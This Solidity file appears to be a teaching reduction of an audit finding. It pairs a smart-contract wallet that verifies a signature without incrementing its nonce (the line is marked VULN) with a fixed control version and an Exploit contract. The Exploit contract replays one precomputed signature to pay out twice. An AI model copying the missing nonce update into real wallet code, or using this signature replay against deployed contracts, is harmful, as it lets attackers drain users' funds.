// SPDX-License-Identifier: MIT
pragma solidity 0.8.27;

/*  Clave — executeTransactionFromOutside does not bump the nonce (Pashov H-01, finding 50017).
    SYNTHETIC, cheatcode-free reduction for the EVM Playground.
    The owner key signed one transfer of 1000 at nonce 0. The outside
    execution checks that signature and does not increment nonce, so the
    same signature pays 1000 again. The control increments nonce, so the
    second submission reverts and only 1000 moves. The signature was
    precomputed for the deterministic wallet address. run() does not warp.
    The missing increment is marked @> VULN. */

contract MockToken {
    string public symbol = "USDC";
    uint8 public constant decimals = 18;
    mapping(address => uint256) public balanceOf;

    function mint(address to, uint256 amount) external {
        balanceOf[to] += amount;
    }

    function transfer(address to, uint256 amount) external returns (bool) {
        require(balanceOf[msg.sender] >= amount, "bal");
        balanceOf[msg.sender] -= amount;
        balanceOf[to] += amount;
        return true;
    }
}

contract Wallet {
    address public constant SIGNER = 0xA03ED8a2e824B880A3D0af7015E1480Be7E1b606;
    MockToken public token;
    uint256 public immutable domain;
    uint256 public nonce;

    constructor(address token_, uint256 domain_) {
        token = MockToken(token_);
        domain = domain_;
    }

    function executeTransactionFromOutside(address to, uint256 amount, bytes calldata signature) external {
        bytes32 signedHash = keccak256(abi.encode(domain, nonce, to, amount));
        require(_recover(signedHash, signature) == SIGNER, "sig");
        // @> VULN: nonce stays unchanged, so this signed transfer can run again
        token.transfer(to, amount);
    }

    function _recover(bytes32 hash, bytes calldata signature) internal pure returns (address) {
        bytes32 r;
        bytes32 s;
        uint8 v;
        assembly {
            r := calldataload(signature.offset)
            s := calldataload(add(signature.offset, 32))
            v := byte(0, calldataload(add(signature.offset, 64)))
        }
        return ecrecover(hash, v, r, s);
    }
}

contract WalletFixed {
    address public constant SIGNER = 0xA03ED8a2e824B880A3D0af7015E1480Be7E1b606;
    MockToken public token;
    uint256 public immutable domain;
    uint256 public nonce;

    constructor(address token_, uint256 domain_) {
        token = MockToken(token_);
        domain = domain_;
    }

    function executeTransactionFromOutside(address to, uint256 amount, bytes calldata signature) external {
        bytes32 signedHash = keccak256(abi.encode(domain, nonce, to, amount));
        require(_recover(signedHash, signature) == SIGNER, "sig");
        nonce += 1;
        token.transfer(to, amount);
    }

    function _recover(bytes32 hash, bytes calldata signature) internal pure returns (address) {
        bytes32 r;
        bytes32 s;
        uint8 v;
        assembly {
            r := calldataload(signature.offset)
            s := calldataload(add(signature.offset, 32))
            v := byte(0, calldataload(add(signature.offset, 64)))
        }
        return ecrecover(hash, v, r, s);
    }
}

contract Exploit {
    uint256 public constant AMOUNT = 1000 ether;
    address public constant PAYEE = 0x0000000000000000000000000000000000000B0b;
    address public constant CONTROL_PAYEE = 0x0000000000000000000000000000000000000C0C;
    // Signed by 0xac0974... for wallet 0x671d..., nonce 0, payee 0xb0b, amount 1000 ether.
    // domain 1, nonce 0, payee 0xb0b, amount 1000 ether.
    bytes public constant SIG =
        hex"16e1ce1d92a852c49f35ab3ea1362785517c30e5ddc80fcbaea01eb51d55ad072504d6f65d92e9dbc652167f9390d18c8f41a4cd8381a1fce58ffd56b4bb01641b";
    // domain 2, nonce 0, payee 0x0c0c, amount 1000 ether.
    bytes public constant CONTROL_SIG =
        hex"c27635390d2653cc61612dbf6219fed1ef324f724b076b048c9017fdc46130820f98aa6af74b246e8f4b06914db9382f28865211c802bd7f82683f7ac3d64d421c";

    MockToken public token; // CREATE nonce 1
    Wallet public wallet; // CREATE nonce 2
    WalletFixed public control; // CREATE nonce 3

    uint256 public firstPay;
    uint256 public replayed;
    uint256 public nonceAfter;
    uint256 public controlPaid;
    bool public controlReplayBlocked;

    constructor() {
        token = new MockToken();
        wallet = new Wallet(address(token), 1);
        control = new WalletFixed(address(token), 2);
    }

    function run() external {
        token.mint(address(wallet), AMOUNT * 2);
        wallet.executeTransactionFromOutside(PAYEE, AMOUNT, SIG);
        firstPay = token.balanceOf(PAYEE);
        wallet.executeTransactionFromOutside(PAYEE, AMOUNT, SIG);
        replayed = token.balanceOf(PAYEE);
        nonceAfter = wallet.nonce();
        require(firstPay == AMOUNT, "first payment was not 1000");
        require(replayed == AMOUNT * 2, "replay did not pay 1000 again");
        require(nonceAfter == 0, "nonce was incremented");

        token.mint(address(control), AMOUNT * 2);
        control.executeTransactionFromOutside(CONTROL_PAYEE, AMOUNT, CONTROL_SIG);
        try control.executeTransactionFromOutside(CONTROL_PAYEE, AMOUNT, CONTROL_SIG) {
            controlReplayBlocked = false;
        } catch {
            controlReplayBlocked = true;
        }
        controlPaid = token.balanceOf(CONTROL_PAYEE);
        require(controlReplayBlocked, "control replayed");
        require(controlPaid == AMOUNT, "control did not pay exactly 1000");
        require(control.nonce() == 1, "control nonce");
    }
}
